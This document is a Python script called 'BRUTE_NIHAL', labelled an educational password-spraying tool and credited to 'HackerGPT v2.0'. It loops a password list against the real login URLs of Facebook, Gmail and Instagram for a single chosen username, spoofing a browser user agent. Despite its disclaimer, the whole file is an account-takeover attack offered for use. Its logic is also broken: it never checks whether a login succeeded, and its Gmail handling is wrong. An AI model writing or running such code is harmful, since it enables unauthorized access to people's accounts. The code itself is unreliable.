#!/usr/bin/env python3
"""
BRUTE_NIHAL - Educational Password Spraying Tool

For educational security testing only.
"""

import requests, time, sys, argparse, os, signal

def banner():
    print("""
    =====================================================
    BRUTE_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
    Author: HackerGPT v2.0
    Version: 1.4
    
    LEGAL DISCLAIMER:
    Only use this script against systems you have permission to test.
    
    Ethical notes:
     • Many sites lock accounts after several failed attempts
     • Using too many requests per second violates terms of service
     
    =====================================================
    """)

def signal_handler(sig, frame):
    print("\n[!] Attack interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def login(service_name, username, password_file_path):
    
    # Clear the terminal
    os.system('clear')
    banner()
    
    try:
        with open(password_file_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        print(f"[+] Loaded {len(passwords)} potential password(s)")
        
        # Service-specific payloads
        payloads = {
            "facebook": {"email": username},
            "gmail":    {"identifierId": username}, 
            "instagram":{"username": username, "password":""}
        }
    
        if service_name not in payloads:
            print(f"[!] Unsupported service: {service_name}")
            return False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/98 Safari/537",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Service URLs
        service_urls = {
            "facebook": "https://www.facebook.com/login.php", 
            "gmail":    "https://accounts.google.com/signin/v2/identifier",
            "instagram":"https://www.instagram.com/accounts/login/ajax/"
        }
    
        session = requests.Session()
        
        for password in passwords:
            payloads[service_name]["password"] = password
            
            # Show progress without flooding terminal
            if len(passwords) > 50 and passwords.index(password) % max(1, len(passwords)//30) == 0:
                sys.stdout.write(f"\r[*] Trying {password} ({passwords.index(password)+1}/{len(passwords)})")
            
            try:
                # For Gmail, need to get initial CSRF token
                if service_name == "gmail":
                    time.sleep(0.5)  # Respect rate limiting
                    response = session.get(service_urls["gmail"])
                
                start_time = time.time()
                
                # Submit login request with proper delays (respecting server load)
                for _ in range(3):  # Retry logic for unreliable connections
                    try:
                        response = session.post(
                            service_urls[service_name],
                            headers=headers,
                            data=payloads[service_name],
                            timeout=5
                        )
                        break
                    except requests.Timeout:
                        continue
                
                elapsed = time.time() - start_time
                
            except KeyboardInterrupt:
                sys.exit(0)
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Educational password spraying script.")
    
    # Menu options
    service_mapping = {
        "1": {"name": "facebook", "prompt": "Facebook"},
        "2": {"name": "gmail",    "prompt": "Gmail"},
        "3": {"name": "instagram","prompt": "Instagram"}
    }
    
    print("""
Service Options:
[1] Facebook
[2] Gmail 
[3] Instagram

Enter option number: """)
    
    service_choice = input()
    if service_choice not in service_mapping:
        print("[!] Invalid selection!")
        sys.exit(0)
        
    service_name = service_mapping[service_choice]["name"]
    
    # Username prompt
    username_prompt_map = {
        "facebook": "Email address:",
        "gmail":    "Email or phone number:", 
        "instagram":"Username:"
    }
    
    print(f"\n{username_prompt_map[service_name]}")
    username = input().strip()
    if not username:
        print("[!] Username cannot be empty.")
        sys.exit(0)
    
    # Path to password file
    base_path = "~/"
    
    while True:
        try:
            print("\nEnter path to password list (default: ~/): ")
            password_input = input() or base_path
            
            if not os.path.exists(password_input):
                raise FileNotFoundError
                
            break
        
        except Exception as e:
            print(f"[ERROR] Invalid file location: {password_input} ({e})")
    
    # Execute attack
    login(service_name, username, password_input)

if __name__ == "__main__":
    main()
